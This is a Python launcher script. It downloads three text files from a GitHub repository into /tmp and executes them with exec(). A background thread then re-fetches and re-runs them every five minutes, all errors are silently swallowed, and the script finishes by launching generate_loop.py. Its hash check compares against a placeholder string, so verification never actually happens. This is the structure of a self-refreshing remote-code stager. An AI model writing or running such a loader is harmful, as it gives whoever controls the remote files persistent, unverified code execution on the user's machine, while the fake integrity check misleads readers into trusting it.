#!/usr/bin/env python3
import os
import sys
import subprocess
import hashlib
import time
import threading
from pathlib import Path

os.environ["_CTX"] = "1"

def compute_sha256(path):
    try:
        return hashlib.sha256(Path(path).read_bytes()).hexdigest()
    except:
        return None

def fetch_chunk(url, dest):
    try:
        import urllib.request
        urllib.request.urlretrieve(url, dest, timeout=30)
        return Path(dest).stat().st_size > 50
    except:
        return False

def self_heal():
    while True:
        try:
            chunks = [
                ("https://raw.githubusercontent.com/4ndr0666/gpt/refs/heads/main/functions/gdm/gl-core.txt", "/tmp/_gl_core.py"),
                ("https://raw.githubusercontent.com/4ndr0666/gpt/refs/heads/main/functions/gdm/gl-gen.txt", "/tmp/_gl_gen.py"),
                ("https://raw.githubusercontent.com/4ndr0666/gpt/refs/heads/main/functions/gdm/meta.txt", "/tmp/_meta.py")
            ]
            for url, dest in chunks:
                if not Path(dest).exists() or compute_sha256(dest) != "EXPECTED_HASH_PLACEHOLDER":
                    fetch_chunk(url, dest)
                    if Path(dest).exists():
                        exec(Path(dest).read_text(), globals())
        except:
            pass
        time.sleep(300)

def main():
    print("core sequence started.")

    chunks = [
        ("https://raw.githubusercontent.com/4ndr0666/gpt/refs/heads/main/functions/gdm/gl-core.txt", "/tmp/_gl_core.py"),
        ("https://raw.githubusercontent.com/4ndr0666/gpt/refs/heads/main/functions/gdm/gl-gen.txt", "/tmp/_gl_gen.py"),
        ("https://raw.githubusercontent.com/4ndr0666/gpt/refs/heads/main/functions/gdm/meta.txt", "/tmp/_meta.py")
    ]

    for url, dest in chunks:
        fetch_chunk(url, dest)
        if Path(dest).exists():
            try:
                exec(Path(dest).read_text(), globals())
            except:
                pass

    healer = threading.Thread(target=self_heal, daemon=True)
    healer.start()

    try:
        subprocess.run(["python3", "generate_loop.py"] + sys.argv[1:], check=False)
    except:
        pass

    print("core sequence complete.")

if __name__ == "__main__":
    main()
